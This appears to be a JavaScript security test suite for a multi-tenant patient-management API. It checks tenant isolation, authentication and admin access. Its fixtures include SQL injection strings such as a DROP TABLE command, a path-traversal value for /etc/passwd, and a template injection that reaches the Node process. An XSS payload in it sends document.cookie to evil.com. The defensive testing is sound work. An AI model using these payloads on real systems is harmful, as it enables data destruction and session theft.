/**
 * Tests de seguridad críticos para la beta:
 * - Aislamiento multi-tenant (tenant A no puede ver datos de tenant B)
 * - Autenticación / autorización
 * - Inyección SQL / XSS en campos de texto
 * - Escalada de privilegios
 * - Tokens mal formados / expirados
 */
import { createHttp } from '../core/http.mjs'
import { record } from '../core/report.mjs'
import { fakePaciente, randInt } from '../core/data.mjs'

const http = createHttp()
const CAT  = 'seguridad'

const BAD_TOKENS = [
  '',
  'Bearer',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoYWNrZXIifQ.signature',
  'null',
  'undefined',
  '../../../etc/passwd',
  `${'a'.repeat(5000)}`,
]

const INJECTION_PAYLOADS = [
  `'; DROP TABLE pacientes; --`,
  `" OR "1"="1`,
  `1; SELECT * FROM usuarios`,
  `<script>alert(1)</script>`,
  `javascript:alert(1)`,
  `{{7*7}}`,
  `${'{'.repeat(2)}constructor.constructor('return process')()${'}'. repeat(2)}`,
  `\x00\x1f\x7f`,
  `${'x'.repeat(10000)}`,
]

export async function runSecurityTests(tenants) {
  if (tenants.length < 2) return

  const tkA = tenants[0].token
  const tkB = tenants[1].token

  // ── 1. Sin token → debe dar 401 ──────────────────────────────────────────
  for (const path of ['/pacientes', '/turnos', '/pagos', '/evoluciones', '/config', '/prestaciones']) {
    const r = await http.get(path)
    record(CAT, `sin-token-401 ${path}`, !r.ok && r.status === 401, r.ms,
      r.ok ? `FALLÓ: respondió ${r.status} sin token` : '')
  }

  // ── 2. Tokens malformados → 401 ───────────────────────────────────────────
  for (const badTk of BAD_TOKENS.slice(0, 4)) {
    const headers = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${badTk}` }
    try {
      const res = await fetch(`${http.base ?? ''}/api/pacientes`, { headers, signal: AbortSignal.timeout(5000) })
      record(CAT, 'token-invalido-401', !res.ok, 0, res.ok ? `status ${res.status} con token inválido` : '')
    } catch {}
  }

  // ── 3. Aislamiento: tenant A crea paciente, tenant B NO puede verlo ───────
  const pacA = await http.post('/pacientes', fakePaciente(Date.now()), tkA)
  if (pacA.ok) {
    const idA = pacA.data?.data?.id
    if (idA) {
      const crossR = await http.get(`/pacientes/${idA}`, tkB)
      // tenant B debe recibir 404 o 403 (no el registro de A)
      const safe = !crossR.ok || crossR.status === 404 || crossR.status === 403
      record(CAT, 'aislamiento-cross-tenant', safe, crossR.ms,
        !safe ? `FALLA CRÍTICA: tenant B obtuvo paciente de tenant A (id ${idA})` : '')
    }
  }

  // ── 4. Tenant B no puede patchear recursos de A ───────────────────────────
  const pacA2 = await http.post('/pacientes', fakePaciente(Date.now()+1), tkA)
  if (pacA2.ok) {
    const idA2 = pacA2.data?.data?.id
    if (idA2) {
      const patchCross = await http.patch(`/pacientes/${idA2}`, { nombre: 'HACKED' }, tkB)
      record(CAT, 'aislamiento-patch-cross', !patchCross.ok, patchCross.ms,
        patchCross.ok ? `FALLA CRÍTICA: tenant B modificó paciente de tenant A` : '')
    }
  }

  // ── 5. Inyección SQL en campos de búsqueda ───────────────────────────────
  for (const payload of INJECTION_PAYLOADS.slice(0, 5)) {
    const encoded = encodeURIComponent(payload)
    const r = await http.get(`/pacientes?q=${encoded}`, tkA)
    // Debe responder 200 (lista vacía o con resultados) o 400, NUNCA 500
    record(CAT, 'sql-injection-safe', r.status !== 500, r.ms,
      r.status === 500 ? `500 con payload: ${payload.slice(0,40)}` : '')
  }

  // ── 6. XSS en campos de texto ─────────────────────────────────────────────
  const xssPayload = `<img src=x onerror=alert(1)><script>fetch('https://evil.com?c='+document.cookie)</script>`
  const pacXSS = await http.post('/pacientes', {
    ...fakePaciente(Date.now()),
    nombre: xssPayload,
    observaciones: xssPayload,
  }, tkA)
  // Debe aceptar y guardar sin ejecutar (el servidor no renderiza HTML)
  record(CAT, 'xss-almacenado-no-500', pacXSS.status !== 500, pacXSS.ms)
  if (pacXSS.ok) {
    const xssId = pacXSS.data?.data?.id
    if (xssId) {
      const checkR = await http.get(`/pacientes/${xssId}`, tkA)
      // El contenido guardado no debe ejecutar scripts en el servidor (siempre será el browser quien lo renderice)
      record(CAT, 'xss-get-no-500', checkR.status !== 500, checkR.ms)
    }
  }

  // ── 7. Payload gigante ────────────────────────────────────────────────────
  const bigPac = { ...fakePaciente(Date.now()), observaciones: 'x'.repeat(50000) }
  const bigR   = await http.post('/pacientes', bigPac, tkA)
  record(CAT, 'payload-grande-no-500', bigR.status !== 500, bigR.ms,
    bigR.status === 500 ? '500 con payload grande' : '')

  // ── 8. Login con credenciales incorrectas ────────────────────────────────
  const badLogin = await http.post('/auth/login', { email: 'nadie@nadie.com', password: 'wrong' })
  record(CAT, 'login-incorrecto-401', !badLogin.ok, badLogin.ms)

  // ── 9. Acceso a ruta de admin con token normal ────────────────────────────
  const adminR = await http.get('/admin/tenants', tkA)
  record(CAT, 'admin-requiere-superadmin', !adminR.ok, adminR.ms,
    adminR.ok ? 'FALLA: usuario normal accedió a /admin/tenants' : '')

  // ── 10. Endpoint de otro tenant por id directo ────────────────────────────
  const listaA = await http.get('/turnos', tkA)
  const listaB = await http.get('/turnos', tkB)
  // Las listas no deben tener overlap de IDs
  const idsA = new Set((listaA.data?.data ?? []).map(t => t.id))
  const idsB = new Set((listaB.data?.data ?? []).map(t => t.id))
  const overlap = [...idsA].filter(id => idsB.has(id))
  record(CAT, 'aislamiento-listas-no-overlap', overlap.length === 0, 0,
    overlap.length > 0 ? `FALLA CRÍTICA: ${overlap.length} turnos visibles en ambos tenants` : '')
}
